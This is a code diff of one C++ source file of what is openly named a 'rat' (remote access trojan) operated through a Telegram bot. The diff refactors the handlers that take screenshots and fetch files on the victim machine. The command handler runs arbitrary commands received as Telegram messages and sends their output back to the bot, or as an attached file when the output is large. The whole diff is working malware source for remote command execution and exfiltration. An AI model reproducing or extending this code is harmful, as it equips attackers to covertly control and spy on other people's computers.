@@ -1,24 +1,20 @@
 /*rat_handler/src/threaded_handler.cpp*/
+#include "process.hpp" //tiny-process-library
 #include "rat/Handler.hpp"
+#include "rat/handler/debug.hpp"
 #include "rat/media.hpp"
 #include "rat/system.hpp"
 #include <boost/algorithm/string.hpp>
+#include <filesystem>
 #include <fmt/chrono.h>
 #include <fmt/core.h>
 #include <memory>
 #include <mutex>
-#include <string>
 #include <sstream>
-#include <filesystem>
-#include "process.hpp" //tiny-process-library
-#include "rat/handler/debug.hpp"
+#include <string>
 
 namespace rat::handler {
 constexpr size_t MAX_TELEGRAM_UPLOAD_SIZE = 50 * 1024 * KB;
-
-// Command handler implementations
-/*This method cannot run asynchronously for big files because the upload will be
- * interrupted from the https requests that are sent from the parent thread */
 
 void Handler::handleGetCommand() {
   if (command.parameters.empty()) {
@@ -68,7 +64,7 @@ void Handler::handleScreenshotCommand() {
     bool success =
         rat::media::screenshot::takeScreenshot(image_path, output_buffer);
 
-    std::lock_guard<std::mutex> lock(backing_bot_mutex);
+    std::lock_guard<std::mutex> lock(this->backing_bot_mutex);
 
     if (success && std::filesystem::exists(image_path)) {
       HANDLER_DEBUG_LOG("{} taken", image_path.string());
@@ -87,66 +83,68 @@ void Handler::handleScreenshotCommand() {
   this->bot->sendMessage("Screenshot command launched.");
 }
 
-void Handler::parseAndHandleProcessCommand() {
-    const std::string& message_text = this->telegram_update->message.text;
+void Handler::handleProcessCommand() {
 
-    this->parseTelegramMessageToCommand();
+  HANDLER_DEBUG_LOG("Creating the process manager for the command {}",
+                    this->telegram_update->message.text);
 
-    HANDLER_DEBUG_LOG("Creating the process manager for the command {}", message_text);
+  this->long_process_pool->enqueue([this]() {
+    std::ostringstream stdout_stream;
+    std::ostringstream stderr_stream;
 
-    this->long_process_pool->enqueue([this]() {
-        std::ostringstream stdout_stream;
-        std::ostringstream stderr_stream;
+    std::mutex stdout_mutex;
+    std::mutex stderr_mutex;
 
-        std::mutex stdout_mutex;
-        std::mutex stderr_mutex;
-
-        auto catching_stdout_lambda = [&stdout_stream, &stdout_mutex](const char *bytes,
-                                                                  size_t n_bytes) {
-            std::lock_guard<std::mutex> lock(stdout_mutex);
-            stdout_stream.write(bytes, n_bytes);
+    const auto catching_stdout_lambda =
+        [&stdout_stream, &stdout_mutex](const char *bytes, size_t n_bytes) {
+          std::lock_guard<std::mutex> lock(stdout_mutex);
+          stdout_stream.write(bytes, n_bytes);
         };
 
-        auto catching_stderr_lambda = [&stderr_stream, &stderr_mutex](const char *bytes,
-                                                                  size_t n_bytes) {
-            std::lock_guard<std::mutex> lock(stderr_mutex);
-            stderr_stream.write(bytes, n_bytes);
+    const auto catching_stderr_lambda =
+        [&stderr_stream, &stderr_mutex](const char *bytes, size_t n_bytes) {
+          std::lock_guard<std::mutex> lock(stderr_mutex);
+          stderr_stream.write(bytes, n_bytes);
         };
 
-        TinyProcessLib::Process process(
-            this->command.parameters,
-            std::filesystem::current_path().string(),
-            catching_stdout_lambda,
-            catching_stderr_lambda
-        );
+    TinyProcessLib::Process process(
+        this->command.parameters, std::filesystem::current_path().string(),
+        catching_stdout_lambda, catching_stderr_lambda);
 
-        const int process_exit_code = process.get_exit_status();
+    const auto &process_id = static_cast<int64_t>(process.get_id());
 
-        const std::string final_message = fmt::format(
-            "Exit_Code:{}\nSTDOUT:{}\nSTDERR:{}\n",
-            process_exit_code,
-            stdout_stream.str(),
-            stderr_stream.str()
-        );
+    this->backing_bot_mutex.lock();
 
-        constexpr size_t TELEGRAM_LIMIT = 3000; // 3 KB safe cap
+    this->backing_bot->sendMessage(
+        fmt::format("Process launched ID: {}", process_id));
 
-        std::unique_lock<std::mutex> lock_bot(this->backing_bot_mutex);
+    this->backing_bot_mutex.unlock();
+    const int process_exit_code = process.get_exit_status();
 
-        if (final_message.size() <= TELEGRAM_LIMIT) {
-            // Safe to send inline
-            this->backing_bot->sendMessage(final_message);
-        } else {
-            // Too big → dump to file
-            std::string filename = fmt::format("process-{}.txt", ::rat::system::getCurrentDateTime_Underscored());
-            std::ofstream outfile(filename, std::ios::trunc);
-            outfile << final_message;
-            outfile.close();
+    const std::string final_message =
+        fmt::format("Exit_Code:{}\nSTDOUT:{}\nSTDERR:{}\n", process_exit_code,
+                    stdout_stream.str(), stderr_stream.str());
 
-            this->backing_bot->sendFile(filename, "Process output too large, see attached file.");
-            std::filesystem::remove(filename);
-        }
-    });
+    constexpr size_t TELEGRAM_LIMIT = 3000; // 3 KB safe cap
+    this->backing_bot_mutex.lock();
+    if (final_message.size() <= TELEGRAM_LIMIT) {
+      this->backing_bot->sendMessage(final_message);
+    } else {
+      const std::string filename = fmt::format(
+          "process-{}.txt", ::rat::system::getCurrentDateTime_Underscored());
+      std::ofstream outfile(filename, std::ios::trunc);
+      outfile << final_message;
+      outfile.close();
+
+      this->backing_bot->sendFile(
+          filename, "Process output too large, see attached file.");
+      std::filesystem::remove(filename);
+    }
+    this->backing_bot_mutex.unlock();
+  });
+  if (this->command.parameters.size() > 4) {
+    this->command.parameters.resize(4);
+  }
 }
 } // namespace rat::handler
 
